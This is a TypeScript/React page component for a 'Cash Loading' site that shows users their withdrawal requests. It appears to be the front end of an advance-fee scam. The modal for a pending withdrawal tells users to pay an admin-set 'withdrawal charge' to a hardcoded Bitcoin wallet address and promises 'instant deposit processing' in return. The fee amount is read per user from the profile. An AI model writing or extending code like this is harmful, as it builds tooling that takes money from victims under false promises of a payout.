import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { toast } from "sonner";

import { AppShell } from "@/components/AppShell";
import { StatusBadge } from "@/components/StatusBadge";
import {
  formatUsd,
  payoutLabels,
  useProfile,
  useWithdrawals,
} from "@/lib/api";

type WithdrawalRow = NonNullable<
  ReturnType<typeof useWithdrawals>["data"]
>[number];

type WithdrawalWithCashappTag = WithdrawalRow & {
  cashapp_tag?: string | null;
  cashtag?: string | null;
  method_summary?: string | null;
  admin_note?: string | null;
};

export const Route = createFileRoute("/_authenticated/transactions")({
  head: () => ({
    meta: [
      { title: "Transactions — Cash Loading" },
      {
        name: "description",
        content:
          "Review your withdrawal requests, their amounts, dates and current status.",
      },
      {
        property: "og:title",
        content: "Transactions — Cash Loading",
      },
      {
        property: "og:description",
        content: "Review your withdrawal requests and their status.",
      },
    ],
  }),
  component: Transactions,
});

function getWithdrawalCashtag(withdrawal: WithdrawalRow) {
  const withdrawalData = withdrawal as WithdrawalWithCashappTag;

  let cashtag =
    withdrawalData.cashapp_tag ??
    withdrawalData.cashtag ??
    "";

  // Extract the actual Cashtag saved inside method_summary
  if (!cashtag && withdrawalData.method_summary) {
    const match = withdrawalData.method_summary.match(
      /Cashtag:\s*([^·]+)/i,
    );

    cashtag = match?.[1]?.trim() ?? "";
  }

  if (!cashtag) return "";

  return cashtag.startsWith("$") ? cashtag : `$${cashtag}`;
}

function WithdrawalDetailsModal({
  withdrawal,
  withdrawalFee,
  onClose,
}: {
  withdrawal: WithdrawalRow;
  withdrawalFee: number;
  onClose: () => void;
}) {
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape") onClose();
    };

    window.addEventListener("keydown", onKey);

    return () => window.removeEventListener("keydown", onKey);
  }, [onClose]);

  const isPending = withdrawal.status === "pending";

  const walletAddress =
    "bc1qdy52excpd03jgsqquv932y8s6gdzgedy42x38x";

  const handleCopyAddress = async () => {
    try {
      await navigator.clipboard.writeText(walletAddress);
      toast.success("Wallet address copied");
    } catch {
      toast.error("Could not copy wallet address");
    }
  };

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4"
      onClick={onClose}
      role="dialog"
      aria-modal="true"
    >
      <div
        className="w-full max-w-md rounded-3xl bg-card p-6 text-center shadow-2xl"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="mx-auto grid h-16 w-16 place-items-center rounded-full border-2 border-amber-500 bg-amber-50 text-amber-500">
          <span className="text-3xl font-extrabold leading-none">
            !
          </span>
        </div>

        <h2 className="mt-4 text-2xl font-extrabold text-foreground">
          {isPending
            ? "Withdrawal Pending"
            : `Withdrawal ${withdrawal.status.toUpperCase()}`}
        </h2>

        <p className="mt-1 text-sm text-muted-foreground">
          {isPending
            ? `Your withdrawal of ${formatUsd(
                Number(withdrawal.amount),
              )} is pending.`
            : `Your withdrawal of ${formatUsd(
                Number(withdrawal.amount),
              )} is ${withdrawal.status}.`}
        </p>

        {isPending && (
          <>
            <p className="mt-5 text-sm leading-6 text-muted-foreground">
              Pay exactly the{" "}
              <span className="font-bold text-foreground">
                {formatUsd(withdrawalFee)}
              </span>{" "}
              withdrawal charge specified by the admin to the wallet address
              below and refresh your Cash Loading account for instant deposit
              processing.
            </p>

            <div className="mt-5 text-left">
              <p className="mb-2 text-xs font-bold uppercase tracking-wide text-muted-foreground">
                Wallet Address
              </p>

              <div className="flex items-center gap-2 rounded-2xl border border-border bg-muted/30 p-3">
                <p className="min-w-0 flex-1 break-all text-sm font-medium text-foreground">
                  {walletAddress}
                </p>

                <button
                  type="button"
                  onClick={handleCopyAddress}
                  className="shrink-0 cursor-pointer rounded-xl bg-foreground px-3 py-2 text-xs font-bold text-background transition hover:opacity-90"
                >
                  Copy
                </button>
              </div>
            </div>
          </>
        )}

        {withdrawal.admin_note?.trim() && (
          <div className="mt-5 rounded-2xl border border-border bg-muted/20 p-4 text-left">
            <p className="whitespace-pre-wrap text-sm text-foreground">
              {withdrawal.admin_note}
            </p>
          </div>
        )}

        <button
          type="button"
          onClick={onClose}
          className="mt-6 w-full cursor-pointer rounded-2xl bg-foreground py-3 font-bold text-background transition hover:opacity-90"
        >
          OK
        </button>
      </div>
    </div>
  );
}

function Transactions() {
  const { data: profile } = useProfile();
  const { data: withdrawals = [], isLoading } = useWithdrawals();

  const [selected, setSelected] = useState<WithdrawalRow | null>(
    null,
  );

  const name = profile?.full_name || "Account";
  const count = withdrawals.length;

  const withdrawalFee = Number(
    (profile as { withdrawal_fee?: number | null } | null)
      ?.withdrawal_fee ?? 0,
  );

  return (
    <AppShell>
      <div className="rounded-3xl border border-border bg-card p-6 shadow-sm sm:p-8">
        <h1 className="text-2xl font-extrabold sm:text-3xl">
          Transactions
        </h1>

        <p className="mt-1 text-sm text-muted-foreground">
          {count}{" "}
          {count === 1
            ? "withdrawal request"
            : "withdrawal requests"}
        </p>

        <div className="mt-6 overflow-x-auto">
          <table className="w-full min-w-[520px] text-sm">
            <thead>
              <tr className="border-b border-border text-left text-xs uppercase text-muted-foreground">
                <th className="py-3 pr-3 font-bold">Name</th>
                <th className="py-3 pr-3 font-bold">Method</th>
                <th className="py-3 pr-3 font-bold">Amount</th>
                <th className="py-3 pr-3 font-bold">Status</th>
                <th className="py-3 font-bold">Date</th>
              </tr>
            </thead>

            <tbody className="divide-y divide-border">
              {withdrawals.map((w) => {
                const cashtag =
                  w.method_type === "cashapp"
                    ? getWithdrawalCashtag(w)
                    : "";

                return (
                  <tr key={w.id}>
                    <td className="py-4 pr-3 font-semibold">
                      {name}
                    </td>

                    <td className="py-4 pr-3">
                      {payoutLabels[w.method_type] ??
                        w.method_type}
                    </td>

                    <td className="py-4 pr-3 font-bold">
                      {formatUsd(Number(w.amount))}
                    </td>

                    <td className="py-4 pr-3">
                      <button
                        type="button"
                        onClick={() => setSelected(w)}
                        className="cursor-pointer transition hover:opacity-80"
                      >
                        <StatusBadge status={w.status} />
                      </button>
                    </td>

                    <td className="whitespace-nowrap py-4 text-xs text-muted-foreground">
                      <div>
                        {new Date(w.created_at).toLocaleString(
                          "en-US",
                          {
                            month: "short",
                            day: "numeric",
                            year: "numeric",
                            hour: "numeric",
                            minute: "2-digit",
                            second: "2-digit",
                            hour12: false,
                          },
                        )}
                      </div>

                      {cashtag && (
                        <div className="mt-1 font-medium text-foreground">
                          ({cashtag})
                        </div>
                      )}
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>

        {withdrawals.length === 0 && (
          <p className="mt-4 text-sm text-muted-foreground">
            {isLoading ? "Loading…" : "No requests yet."}
          </p>
        )}
      </div>

      {selected && (
        <WithdrawalDetailsModal
          withdrawal={selected}
          withdrawalFee={withdrawalFee}
          onClose={() => setSelected(null)}
        />
      )}
    </AppShell>
  );
}
